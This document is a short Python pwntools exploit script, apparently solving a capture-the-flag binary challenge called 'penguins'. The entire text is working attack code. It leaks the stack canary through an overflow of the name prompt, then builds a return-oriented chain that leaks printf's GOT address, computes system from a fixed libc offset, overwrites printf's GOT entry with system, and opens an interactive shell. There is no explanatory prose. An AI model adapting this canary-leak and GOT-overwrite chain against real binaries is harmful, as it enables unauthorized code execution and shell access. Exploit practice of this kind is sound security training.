from pwn import *

p = process('./penguins')
e=ELF('./penguins')

cmd='/bin/sh'
pr=0x080487b6
pppr=0x08048799
offset=0xe8d0
#context(arch='i386',os='linux',endian='little',log_level='debug')
p.sendafter("name?? : ","A"*249)

p.recvuntil("A"*249)

canary=u32("\x00"+p.recv(3))

print "canary :"+hex(canary)

payload="A"*248
payload+=p32(canary)
payload+="A"*4
payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.bss())
payload+=p32(len(cmd)+1)

payload+=p32(e.plt['puts'])
payload+=p32(pr)
payload+=p32(e.got['printf'])

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.got['printf'])
payload+=p32(4)

payload+=p32(e.plt['printf'])
payload+="AAAA"
payload+=p32(e.bss())


p.sendlineafter(':',payload)
p.sendline(cmd)

printf = u32(p.recv(4))
system = printf - offset

p.sendline(p32(system))

p.interactive()
